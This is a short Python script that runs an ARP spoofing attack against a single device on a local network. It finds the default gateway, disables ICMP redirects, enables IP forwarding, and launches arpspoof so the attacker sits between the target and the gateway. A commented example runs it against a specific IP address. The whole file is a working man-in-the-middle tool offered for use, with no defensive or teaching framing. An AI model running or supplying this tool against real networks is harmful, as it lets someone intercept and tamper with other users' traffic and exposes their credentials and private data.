import subprocess
import re
import os
import sys

def get_default_gateway_linux():
    try:
        result = os.popen("ip route show default").read()
        gateway_ip = result.split(" ")[2]
        return gateway_ip
    except Exception as e:
        print(f"Error: {e}")
        return None

def run_arpspoof(device_ip, gateway_ip, interface):
    command = f"sudo arpspoof -i {interface} -t {device_ip} {gateway_ip}"

    # Run the command and capture the output
    result = subprocess.run(command, shell=True, stderr=subprocess.PIPE, text=True)

    # Print the output and return code
    print(f'Output for {device_ip}:', result.stderr)
    print(f'Return Code for {device_ip}:', result.returncode)

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 arp_spoof.py <device_ip>")
        return

    specific_device_ip = sys.argv[1]
    gateway_ip = get_default_gateway_linux()
    interface = "wlo1"  # Replace with your network interface name

    if not gateway_ip:
        print("Unable to determine the default gateway.")
        return

    # Disable send redirects for all interfaces
    command1 = "sudo sysctl -w net.ipv4.conf.all.send_redirects=0"

    # Enable IP forwarding
    command2 = "sudo sysctl net.ipv4.ip_forward=1"

    # Run the sysctl commands
    subprocess.run(command1, shell=True, check=True)
    subprocess.run(command2, shell=True, check=True)

    # Run ARP spoofing for the specific device
    run_arpspoof(specific_device_ip, gateway_ip, interface)

if __name__ == "__main__":
    main()


#sudo python3 arpSpoof.py 172.19.12.117
